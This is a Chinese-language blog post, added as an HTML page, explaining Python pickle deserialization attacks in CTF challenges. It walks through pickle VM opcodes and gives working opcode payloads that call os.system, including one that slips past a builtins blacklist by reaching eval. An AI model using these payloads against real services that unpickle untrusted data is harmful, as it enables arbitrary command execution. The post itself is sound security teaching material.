@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#20293a">
+	<meta name="msapplication-TileColor" content="#20293a">
+<meta itemprop="name" content="pickle">
+<meta itemprop="description" content="相关介绍看手册就行，写的不能再详细。
+那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？
+毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：
+import builtins import io import pickle safe_builtins = { &#39;range&#39;, &#39;complex&#39;, &#39;set&#39;, &#39;frozenset&#39;, &#39;slice&#39;, } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &#34;builtins&#34; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&#34;global &#39;%s.%s&#39; is forbidden&#34; % (module, name)) def restricted_loads(s): &#34;&#34;&#34;Helper function analogous to pickle.loads().&#34;&#34;&#34; return RestrictedUnpickler(io.BytesIO(s)).load() test= b&#34;cos\nsystem\n(S&#39;echo hello world&#39;\ntR.&#34; restricted_loads(test) 其中这里重写了find_class"><meta itemprop="datePublished" content="2021-08-14T23:30:20+08:00" />
+<meta itemprop="dateModified" content="2021-08-14T23:30:20+08:00" />
+<meta itemprop="wordCount" content="554">
+<meta itemprop="keywords" content="" /><meta property="og:title" content="pickle" />
+<meta property="og:description" content="相关介绍看手册就行，写的不能再详细。
+那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？
+毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：
+import builtins import io import pickle safe_builtins = { &#39;range&#39;, &#39;complex&#39;, &#39;set&#39;, &#39;frozenset&#39;, &#39;slice&#39;, } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &#34;builtins&#34; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&#34;global &#39;%s.%s&#39; is forbidden&#34; % (module, name)) def restricted_loads(s): &#34;&#34;&#34;Helper function analogous to pickle.loads().&#34;&#34;&#34; return RestrictedUnpickler(io.BytesIO(s)).load() test= b&#34;cos\nsystem\n(S&#39;echo hello world&#39;\ntR.&#34; restricted_loads(test) 其中这里重写了find_class" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://theoyu.top/posts/pickle/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-14T23:30:20+08:00" />
+<meta property="article:modified_time" content="2021-08-14T23:30:20+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="pickle"/>
+<meta name="twitter:description" content="相关介绍看手册就行，写的不能再详细。
+那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？
+毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：
+import builtins import io import pickle safe_builtins = { &#39;range&#39;, &#39;complex&#39;, &#39;set&#39;, &#39;frozenset&#39;, &#39;slice&#39;, } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &#34;builtins&#34; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&#34;global &#39;%s.%s&#39; is forbidden&#34; % (module, name)) def restricted_loads(s): &#34;&#34;&#34;Helper function analogous to pickle.loads().&#34;&#34;&#34; return RestrictedUnpickler(io.BytesIO(s)).load() test= b&#34;cos\nsystem\n(S&#39;echo hello world&#39;\ntR.&#34; restricted_loads(test) 其中这里重写了find_class"/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>pickle</title>
+	<link rel="stylesheet" href="https://theoyu.top/css/style.min.948bbb56de2e03535e20f1dcdeada9d463fac9cb3e67a99667928e9208ec6fa8.css" integrity="sha256-lIu7Vt4uA1NeIPHc3q2p1GP6ycs+Z6mWZ5KOkgjsb6g=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://theoyu.top/">Theoyu&#39;s Blog</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://theoyu.top/posts/">Posts</a>
+				<a href="https://theoyu.top/about-me/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="mailto:zeyu.ou@foxmail.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://instagram.com/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/yuuuuu422" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://theoyu.top/posts/">Posts</a></li>
+			<li><a href="https://theoyu.top/about-me/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Aug 14, 2021</span></div>
+				<h1>pickle</h1>
+			</header>
+			<div class="content">
+				<p> 相关介绍看<a href="https://docs.python.org/zh-cn/3/library/pickle.html">手册</a>就行，写的不能再详细。</p>
+<p>那么如果一个允许Unpickle的场景，环境一般会做怎么样的限制呢？</p>
+<p>毫无疑问又演变成沙盒了，在如今ctf越来越卷的情况下，限制条件也是越来越苛刻。从官方给的一个demo看看：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">builtins</span>
+<span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+
+<span class="n">safe_builtins</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;range&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;complex&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;set&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;frozenset&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;slice&#39;</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="c1"># Only allow safe classes from builtins.</span>
+        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">&#34;builtins&#34;</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">safe_builtins</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+        <span class="c1"># Forbid everything else.</span>
+        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&#34;global &#39;</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">&#39; is forbidden&#34;</span> <span class="o">%</span>
+                                     <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">restricted_loads</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="s2">&#34;&#34;&#34;Helper function analogous to pickle.loads().&#34;&#34;&#34;</span>
+    <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
+
+<span class="n">test</span><span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S&#39;echo hello world&#39;</span><span class="se">\n</span><span class="s2">tR.&#34;</span>
+<span class="n">restricted_loads</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
+</code></pre></div><p>其中这里重写了<code>find_class</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815152312.png" alt="image-20210815152312283"></p>
+<p>对<strong>module</strong>限制为<strong>builtins</strong>,并且只允许<strong>safe_builtins</strong>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">🌀  pickle  python3 main.py
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">&#34;/Users/theoyu/workspace/python/pickle/main.py&#34;</span>, line 32, in &lt;module&gt;
+    restricted_loads<span class="o">(</span><span class="nb">test</span><span class="o">)</span>
+  File <span class="s2">&#34;/Users/theoyu/workspace/python/pickle/main.py&#34;</span>, line 28, in restricted_loads
+    <span class="k">return</span> RestrictedUnpickler<span class="o">(</span>io.BytesIO<span class="o">(</span>s<span class="o">))</span>.load<span class="o">()</span>
+  File <span class="s2">&#34;/Users/theoyu/workspace/python/pickle/main.py&#34;</span>, line 22, in find_class
+    raise pickle.UnpicklingError<span class="o">(</span><span class="s2">&#34;global &#39;%s.%s&#39; is forbidden&#34;</span> %
+_pickle.UnpicklingError: global <span class="s1">&#39;os.system&#39;</span> is forbidden
+</code></pre></div><p>而出题的话，当然不会直接限制死，往往都是黑名单漏几个，白名单多几个，去构造。这就需要我们手撕opcode，因为<code>__reduce__</code>只能返回一个元祖，沙盒逃逸的情况往往都是一长串的。</p>
+<p>要解析opcode自然离不开PVM(Pickle Virtual Machine)，pvm涉及到三个部分：</p>
+<ul>
+<li>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 停止。最终留在栈顶的值将被作为反序列化对象返回。</li>
+<li>栈区：最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护<strong>最顶层的信息</strong>，而前序栈维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。</li>
+<li>存储区(memo)：将反序列化完成的数据以 <code>key-value</code> 的形式储存在memo中，以便后来使用。大多数情况，我们并不需要用到这个部分。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/08/20210815155926.png" alt=""></p>
+<p>Pickletools是一个利于我们反汇编pickle的工具，举一个例子看看</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pickletools</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s1">&#39;whoami&#39;</span><span class="p">,))</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">exp</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</code></pre></div><p>同时，<code>pickle.dumps</code>一共有6种形式，其中版本0最利于我们观察，越往后为了效率增加了很多字符，不过好在load是向前兼容的，所以我们后面的分析都采用版本0</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cposix
+system
+p0
+<span class="o">(</span>Vwhoami
+p1
+tp2
+Rp3
+.
+    0: c    GLOBAL     <span class="s1">&#39;posix system&#39;</span>
+   14: p    PUT        <span class="m">0</span>
+   17: <span class="o">(</span>    MARK
+   18: V        UNICODE    <span class="s1">&#39;whoami&#39;</span>
+   26: p        PUT        <span class="m">1</span>
+   29: t        TUPLE      <span class="o">(</span>MARK at 17<span class="o">)</span>
+   30: p    PUT        <span class="m">2</span>
+   33: R    REDUCE
+   34: p    PUT        <span class="m">3</span>
+   37: .    STOP
+highest protocol among <span class="nv">opcodes</span> <span class="o">=</span> <span class="m">0</span>
+
+</code></pre></div><p>关于opcode的语法，官方<a href="https://github.com/python/cpython/blob/3.8/Lib/pickle.py">源码</a>有点含糊，不过有师傅总结下来了：</p>
+<table>
+<thead>
+<tr>
+<th>opcode</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+<th>memo上的变化</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S&rsquo;xxx'\n（也可以使用双引号、'等python字符串形式）</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+<td>无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn\n</td>
+<td>无</td>
+<td>对象被储存</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+<td>无</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+<td>无</td>
+</tr>
+</tbody>
+</table>
+<p>结合语法，重新分析一下opcode</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">    0: c    GLOBAL     <span class="s1">&#39;posix system  &#39;</span> <span class="c1">#对象入栈 unix为posix windows为nt</span>
+   14: p    PUT        <span class="m">0</span> 						  	<span class="c1">#存储到memo的0位置</span>
+   17: <span class="o">(</span>    MARK  									    <span class="c1">#向栈中压入一个MARK标记 左括号标志符</span>
+   18: V        UNICODE    <span class="s1">&#39;whoami&#39;</span>     <span class="c1">#压入一个字符串</span>
+   26: p        PUT        <span class="m">1</span>            <span class="c1">#存储到memo的1位置</span>
+   29: t        TUPLE      <span class="o">(</span>MARK at 17<span class="o">)</span> <span class="c1">#在栈中寻找上一个MARK标记，将其和中间内容出栈，参数形成元祖入栈</span>
+   30: p    PUT        2							  <span class="c1">#存储到memo的2位置</span>
+   33: R    REDUCE											<span class="c1"># system(&#34;whoami&#34;)出栈，结果如栈</span>
+   34: p    PUT        3								<span class="c1"># 结果存储到memo3</span>
+   37: .    STOP												<span class="c1"># 停止</span>
+</code></pre></div><p>结合语法来说的话，还是可以理解了，加上memo上的操作可以省略，简化为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">pickle</span>
+
+<span class="n">a</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;cposix
+</span><span class="s1">system
+</span><span class="s1">(Vwhoami
+</span><span class="s1">tR.&#39;&#39;&#39;</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">a</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="c1">#theoyu</span>
+</code></pre></div><p>上面用了<strong>R</strong>做了函数执行，同时<strong>i</strong>，<strong>o</strong>稍作修改也可以达到一样的效果</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># o</span>
+<span class="s1">&#39;&#39;&#39;(cos
+</span><span class="s1">system
+</span><span class="s1">S&#39;whoami&#39;
+</span><span class="s1">o.&#39;&#39;&#39;</span>
+<span class="n">pickletools</span><span class="o">-&gt;</span>
+    <span class="mi">0</span><span class="p">:</span> <span class="p">(</span>    <span class="n">MARK</span>
+    <span class="mi">1</span><span class="p">:</span> <span class="n">c</span>        <span class="n">GLOBAL</span>     <span class="s1">&#39;os system&#39;</span>
+   <span class="mi">12</span><span class="p">:</span> <span class="n">S</span>        <span class="n">STRING</span>     <span class="s1">&#39;whoami&#39;</span>
+   <span class="mi">22</span><span class="p">:</span> <span class="n">o</span>        <span class="n">OBJ</span>        <span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
+   <span class="mi">23</span><span class="p">:</span> <span class="o">.</span>    <span class="n">STOP</span>
+
+
+<span class="c1"># i</span>
+<span class="s1">&#39;&#39;&#39;(S&#39;whoami&#39;
+</span><span class="s1">ios
+</span><span class="s1">system
+</span><span class="s1">.&#39;&#39;&#39;</span>
+<span class="n">pickletools</span><span class="o">-&gt;</span>
+    <span class="mi">0</span><span class="p">:</span> <span class="p">(</span>    <span class="n">MARK</span>
+    <span class="mi">1</span><span class="p">:</span> <span class="n">S</span>        <span class="n">STRING</span>     <span class="s1">&#39;whoami&#39;</span>
+   <span class="mi">11</span><span class="p">:</span> <span class="n">i</span>        <span class="n">INST</span>       <span class="s1">&#39;os system&#39;</span> <span class="p">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">0</span><span class="p">)</span>
+   <span class="mi">22</span><span class="p">:</span> <span class="o">.</span>    <span class="n">STOP</span>
+
+</code></pre></div><p>拿p神经典的code_break试试：</p>
+<ul>
+<li>模块白名单：<code>builtins</code></li>
+<li>子模块黑名单：<code>'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'</code></li>
+</ul>
+<p>因为只禁用了子模块，我们可以先通过一轮global+get重新筛选出builtins，再构造即可。</p>
+<p>先构造<code>__builtins__.globals().get('__builtins__')</code>拿到可以执行eval的builtins,再执行<code>builtins.getattr(builtins, 'eval'),('__import__(&quot;os&quot;).system(&quot;whoami&quot;)',)</code>即可。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">cbuiltins</span>
+<span class="nb">getattr</span>
+<span class="p">(</span><span class="n">cbuiltins</span>
+<span class="nb">getattr</span>
+<span class="p">(</span><span class="n">cbuiltins</span>
+<span class="nb">dict</span>
+<span class="n">S</span><span class="s1">&#39;get&#39;</span>
+<span class="n">tR</span><span class="p">(</span><span class="n">cbuiltins</span>
+<span class="nb">globals</span>
+<span class="p">(</span><span class="n">tRS</span><span class="s1">&#39;__builtins__&#39;</span>   <span class="c1">#拿到bultins</span>
+<span class="n">tRS</span><span class="s1">&#39;eval&#39;</span>
+<span class="n">tRp1</span>
+<span class="p">(</span><span class="n">S</span><span class="s1">&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;</span>
+<span class="n">tR</span><span class="o">.</span>
+</code></pre></div><p>不过这样看起来还是有一些费劲的,学长@iv4n写的<a href="https://github.com/eddieivan01/pker">pker</a>利用遍历AST结点自动化构建解决了这个问题</p>
+<p>上述例子只需要构造：</p>
+<pre><code class="language-pker" data-lang="pker">getattr = GLOBAL('builtins', 'getattr')
+dict = GLOBAL('builtins', 'dict')
+dict_get = getattr(dict, 'get')
+globals = GLOBAL('builtins', 'globals')
+builtins = globals()
+__builtins__ = dict_get(builtins, '__builtins__')
+eval = getattr(__builtins__, 'eval')
+eval('__import__(&quot;os&quot;).system(&quot;whoami&quot;)')
+return
+</code></pre><p>其中</p>
+<pre><code>GLOBAL
+对应opcode：b'c'
+获取module下的一个全局对象（没有import的也可以，比如下面的os）：
+GLOBAL('os', 'system')
+输入：module,instance(callable、module都是instance)  
+
+INST
+对应opcode：b'i'
+建立并入栈一个对象（可以执行一个函数）：
+INST('os', 'system', 'ls')  
+输入：module,callable,para 
+
+OBJ
+对应opcode：b'o'
+建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
+OBJ(GLOBAL('os', 'system'), 'ls') 
+输入：callable,para
+
+xxx(xx,...)
+对应opcode：b'R'
+使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）
+
+li[0]=321
+或
+globals_dic['local_var']='hello'
+对应opcode：b's'
+更新列表或字典的某项的值
+
+xx.attr=123
+对应opcode：b'b'
+对xx对象进行属性设置
+
+return
+对应opcode：b'0'
+出栈（作为pickle.loads函数的返回值）：
+</code></pre><p>即可生成opcode。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a></li>
+<li><a href="https://xz.aliyun.com/t/7012#toc-0">通过AST来构造Pickle opcode</a></li>
+<li><a href="https://github.com/eddieivan01/pker">pker</a></li>
+</ul>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg></p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-08-14 23:30 &#43;0800</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="next-post" href="https://theoyu.top/posts/essay/%E9%9A%8F%E7%AC%940x02/">
+				<span class="post-nav-label"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>&nbsp;</span><br><span>something0x02</span>
+			</a>
+			<a class="prev-post" href="https://theoyu.top/posts/mysql-read-file/">
+				<span class="post-nav-label">&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>When Mysql read your file</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://theoyu.top/">Theoyu</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
